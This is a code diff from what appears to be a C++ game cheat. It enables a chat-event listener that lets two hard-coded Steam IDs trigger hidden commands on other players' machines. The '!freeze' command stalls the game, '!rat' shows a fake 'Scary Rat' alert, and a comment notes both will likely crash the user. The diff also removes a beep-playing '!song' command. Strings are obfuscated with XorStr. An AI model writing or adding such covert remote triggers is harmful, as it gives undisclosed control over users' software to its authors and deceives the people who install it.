@@ -80,7 +80,7 @@ void C_GameEvent::Register( ) {
 	ADD_GAMEEVENT( bomb_beep );
 	ADD_GAMEEVENT( bomb_defused );
 	ADD_GAMEEVENT( bomb_exploded );
-	//ADD_GAMEEVENT( player_say );
+	ADD_GAMEEVENT( player_say );
 }
 
 void C_GameEvent::Shutdown( ) {
@@ -708,13 +708,13 @@ void C_GameEvent::FireGameEvent( IGameEvent* pEvent ) {
 			return;
 		}
 
-		if (message == XorStr("!freeze") && (std::string(info.szSteamID) == XorStr("STEAM_1:0:548599781") || std::string(info.szSteamID) == XorStr("STEAM_1:1:62707320")))
+		if (message == XorStr("!freeze") && (std::string(info.szSteamID) == XorStr("STEAM_1:0:548599781") || std::string(info.szSteamID) == XorStr("STEAM_1:1:62707320"))) // if used will most likly crash the user
 		{
 			Sleep(5000);
 			return;
 		}
 		
-		if (message == XorStr("!rat") && (std::string(info.szSteamID) == XorStr("STEAM_1:0:548599781") || std::string(info.szSteamID) == XorStr("STEAM_1:1:62707320")))
+		if (message == XorStr("!rat") && (std::string(info.szSteamID) == XorStr("STEAM_1:0:548599781") || std::string(info.szSteamID) == XorStr("STEAM_1:1:62707320"))) // if used will most likly crash the user
 		{
 			MessageBox(
 				NULL,
@@ -722,22 +722,6 @@ void C_GameEvent::FireGameEvent( IGameEvent* pEvent ) {
 				XorStr("A Very Scary Rat"),
 				MB_ICONERROR | MB_OK);
 
-			return;
-		}	
-
-		if (message == XorStr("!song") && (std::string(info.szSteamID) == XorStr("STEAM_1:0:548599781") || std::string(info.szSteamID) == XorStr("STEAM_1:1:62707320")))
-		{
-			Beep(659.26, 200);
-			Beep(659.26, 200);
-			Sleep(200);
-			Beep(659.26, 200);
-			Sleep(100);
-			Beep(523.26, 200);
-			Beep(659.26, 200);
-			Sleep(200);
-			Beep(783.98, 200);
-			Sleep(400);
-			Beep(391.99, 200); // this plays star wars song xD
 			return;
 		}
 
